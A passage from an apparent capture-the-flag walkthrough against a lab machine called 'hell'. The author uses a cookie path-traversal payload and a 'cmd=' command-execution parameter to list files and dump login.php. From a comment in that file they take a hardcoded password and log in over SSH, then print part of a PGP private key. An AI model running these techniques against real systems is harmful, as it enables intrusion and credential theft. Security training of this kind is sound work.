</span><span class='line'>&gt; GET /super_secret_login_path_muhahaha/panel.php?cmd=id HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 10.10.10.146
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Cookie: intruder=....//....//....//....//....//....//tmp//note.txt; failcount=3; PHPSESSID=cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>&gt;
</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'><span class="nt">&lt; HTTP</span><span class="err">/</span><span class="na">1</span><span class="err">.</span><span class="na">1</span> <span class="na">302</span> <span class="na">Found</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Date:</span> <span class="na">Wed</span><span class="err">,</span> <span class="na">15</span> <span class="na">Jul</span> <span class="na">2015</span> <span class="na">00:16:47</span> <span class="na">GMT</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Server:</span> <span class="na">Apache</span><span class="err">/</span><span class="na">2</span><span class="err">.</span><span class="na">2</span><span class="err">.</span><span class="na">22</span> <span class="err">(</span><span class="na">Debian</span><span class="err">)</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">X-Powered-By:</span> <span class="na">PHP</span><span class="err">/</span><span class="na">5</span><span class="err">.</span><span class="na">4</span><span class="err">.</span><span class="na">4-14</span><span class="err">+</span><span class="na">deb7u11</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Expires:</span> <span class="na">Thu</span><span class="err">,</span> <span class="na">19</span> <span class="na">Nov</span> <span class="na">1981</span> <span class="na">08:52:00</span> <span class="na">GMT</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Cache-Control:</span> <span class="na">no-store</span><span class="err">,</span> <span class="na">no-cache</span><span class="err">,</span> <span class="na">must-revalidate</span><span class="err">,</span> <span class="na">post-check=</span><span class="s">0,</span> <span class="na">pre-check=</span><span class="s">0</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Pragma:</span> <span class="na">no-cache</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Location:</span> <span class="na">index</span><span class="err">.</span><span class="na">php</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Vary:</span> <span class="na">Accept-Encoding</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Length:</span> <span class="na">620</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Type:</span> <span class="na">text</span><span class="err">/</span><span class="na">html</span>
</span><span class='line'><span class="err">&lt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="na">HTML</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span><span class='line'>* Connection #0 to host 10.10.10.146 left intact
</span><span class='line'>* Closing connection #0
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/home -c cookies -b cookies
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>total 20
</span><span class='line'>drwx------ 3 bazza       bazza       4096 Jul 13 01:43 bazza
</span><span class='line'>drwx--x--x 3 george      george      4096 Jul 12 07:27 george
</span><span class='line'>drwx------ 5 jack        jack        4096 Jul 12 05:28 jack
</span><span class='line'>drwx------ 2 milk_4_life milk_4_life 4096 Jul 12 06:59 milk_4_life
</span><span class='line'>drwx------ 2 oj          oj          4096 Jul 14 01:49 oj
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we can see there are 5 users under folder <code>/home</code>: <strong>bazza</strong>, <strong>george</strong>, <strong>jack</strong>, <strong>milk_4_life</strong> and <strong>oj</strong></p>

<h2>Moving to <strong>jack</strong></h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/var/www/ -c cookies -b cookies
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>total 112
</span><span class='line'>-rw-r--r-- 1 www-data www-data 87841 Jun 17  2014 comic.png
</span><span class='line'>-rwxr--r-- 1 www-data www-data  7846 Jun 20  2014 echoserver.bak
</span><span class='line'>-rw-r--r-- 1 www-data www-data   466 Jun 20  2014 index.html
</span><span class='line'>drwxr-xr-x 2 www-data www-data  4096 Jun 20  2014 personal
</span><span class='line'>-rw-r--r-- 1 www-data www-data    80 Jun 17  2014 robots.txt
</span><span class='line'>drwxr-xr-x 2 www-data www-data  4096 Jul 13 05:32 super_secret_login_path_muhahaha
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here I found some sensitive information in <code>login.php</code> file.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=cat+login.php -c cookies -b cookies
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'><span class="cp">&lt;?PHP</span>
</span><span class='line'><span class="cp">session_start();</span>
</span><span class='line'>
</span><span class='line'><span class="cp">function login(){</span>
</span><span class='line'><span class="cp"> </span>
</span><span class='line'><span class="cp"> $username = mysql_escape_string($_POST[&quot;username&quot;]);</span>
</span><span class='line'><span class="cp"> $password = mysql_escape_string($_POST[&quot;password&quot;]);</span>
</span><span class='line'><span class="cp"> // mysql_connect(&quot;127.0.0.1&quot;, &quot;Jack&quot;, &quot;zgcR6mU6pX&quot;) or die (&quot;Server Error&quot;); I&#39;ll change this back once development is done. Got sick of typing my password.  </span>
</span><span class='line'><span class="cp"> mysql_connect(&quot;127.0.0.1&quot;, &quot;www-data&quot;, &quot;website&quot;) or die(&quot;Server Error&quot;);</span>
</span><span class='line'><span class="cp"> mysql_select_db(&quot;website&quot;) or die(&quot;Server Error&quot;);</span>
</span><span class='line'><span class="cp"> $sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</span>
</span><span class='line'><span class="cp"> $res = mysql_query($sql) or die(&quot;Server Error&quot;);</span>
</span><span class='line'><span class="cp"> $row = mysql_fetch_row($res);</span>
</span><span class='line'><span class="cp"> if ($row[0]) {</span>
</span><span class='line'><span class="cp">     return 1;</span>
</span><span class='line'><span class="cp"> } else {</span>
</span><span class='line'><span class="cp">     return 0;</span>
</span><span class='line'><span class="cp"> }</span>
</span><span class='line'><span class="cp">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">if (login()) {</span>
</span><span class='line'><span class="cp"> $_SESSION[&quot;valid&quot;] = 1;</span>
</span><span class='line'><span class="cp"> setcookie(time()+600);</span>
</span><span class='line'><span class="cp"> header(&#39;Location: index.php&#39;);</span>
</span><span class='line'><span class="cp">} else {</span>
</span><span class='line'><span class="cp"> header(&#39;Location: index.php?the_user_is_a_failure=1&#39;);</span>
</span><span class='line'><span class="cp">}</span>
</span><span class='line'><span class="cp">?&gt;</span>
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>From the comment, I got credential: <em><font color="red">jack</font> / <font color="red">zgcR6mU6pX</font></em>
I also got mysql&rsquo;s login credential is <em><font color="red">www-data</font> / <font color="red">website</font></em></p>

<p>Trying SSH login as jack with discovered password and it works! Now I am jack.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~# ssh jack@10.10.10.146
</span><span class='line'>jack@10.10.10.146&#39;s password:
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>No mail.
</span><span class='line'>Last login: Sun Jul 12 05:12:42 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1001(jack) gid=1001(jack) groups=1001(jack)
</span><span class='line'>$ pwd
</span><span class='line'>/home/jack
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>drwx------ 2 jack jack 4096 Jun 18  2014 g0tmi1k_pics
</span><span class='line'>$ ls -l g0tmi1k_pics
</span><span class='line'>total 284
</span><span class='line'>-rwx------ 1 jack jack 180289 Dec  1  2010 1.jpg
</span><span class='line'>-rwx------ 1 jack jack  29494 Sep 12  2013 2.jpg
</span><span class='line'>-rwx------ 1 jack jack  72070 Jun 18  2014 3.jpg
</span><span class='line'>$ ls -lah
</span><span class='line'>total 32K
</span><span class='line'>drwx------ 5 jack jack 4.0K Jul 12 05:28 .
</span><span class='line'>drwxr-xr-x 7 root root 4.0K Jul  5  2014 ..
</span><span class='line'>-rwx------ 1 jack jack    1 Jun 22  2014 .bash_logout
</span><span class='line'>-rwx------ 1 jack jack 3.4K Jun 18  2014 .bashrc
</span><span class='line'>drwx------ 2 jack jack 4.0K Jun 18  2014 g0tmi1k_pics
</span><span class='line'>drwx------ 2 jack jack 4.0K Jul 12 05:30 .gnupg
</span><span class='line'>drwx------ 2 jack jack 4.0K Jun 18  2014 .pgp
</span><span class='line'>-rwx------ 1 jack jack  675 Jan  1  2013 .profile
</span><span class='line'>$ cd .pgp
</span><span class='line'>$ ls -lah
</span><span class='line'>total 20K
</span><span class='line'>drwx------ 2 jack jack 4.0K Jun 18  2014 .
</span><span class='line'>drwx------ 5 jack jack 4.0K Jul 12 05:28 ..
</span><span class='line'>-rwx------ 1 jack jack   39 Jun 18  2014 note
</span><span class='line'>-rwx------ 1 jack jack 1.8K Jun 18  2014 pgp.priv
</span><span class='line'>-rwx------ 1 jack jack  890 Jun 18  2014 pgp.pub
</span><span class='line'>$ cat note
</span><span class='line'>The usual password as with everything.
</span><span class='line'>$ cat pgp.priv
</span><span class='line'>-----BEGIN PGP PRIVATE KEY BLOCK-----
</span><span class='line'>Version: BCPG C# v1.6.1.0
</span><span class='line'>
</span><span class='line'>lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
</span><span class='line'>bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o
</span><span class='line'>u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR
</span><span class='line'>lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil
</span><span class='line'>54J+LN7se3jKuFcRM+i9TF08hsTtM6azl7X4yyEDhHcvWgFY/vyggEwe6/ZP1IKG
</span><span class='line'>zzAWi0sx7tlZLxyr9AFSXLwLvbhUpR3M5rJBABEBAAH/AwMC8ht700SVD+1guMSO
</span><span class='line'>NKMnwLvKkrmW32b/zo/x4g4MbhUs1BXIvHfGw1ArsEpkMucb8utDqGzcwctR00de
</span><span class='line'>jTr/nFo0gKxBMgc34e9HNTI0iFlVYWDFZqU4ie6/Pyt8qvZHOe5Aq0qPsCkcdMME
</span><span class='line'>bR6EQng1ZBXX7zHCF2TobPnIxp5CGI2WUwXmXaGQS/hRriIcAhDx5ZFFqOdVQWES
</span><span class='line'>mLo5Rd205/M4mungbUvwrHayu6ZGume+VXs630YaacNiBFpXnPDfKOCipZ+EhYsz
</span><span class='line'>7febMxXj3mANwLXQfyTZOIXPzMptE11fbDA8jpy9m0vMy5ZCpJnp/VoTaaUxMz45
</span><span class='line'>OeUI9nKTx9P1lGPC9hYidshg3Sg5Iz/qqmL/byAv1bUV2YOdJlAS1XY9Jj/wNrYz
</span><span class='line'>yG9ASw5nfp0ChhLYnnU4dgfEk5bajGvgnhZAlb/+yNvJ5eUcwivjFC8jJUwlrZ+Z
</span><span class='line'>oj1XAC4148JsjcQHW1d7yONc4iI7tSubMNa5GfBal1BxMRLP3nSZ4ICl67gTjrKH
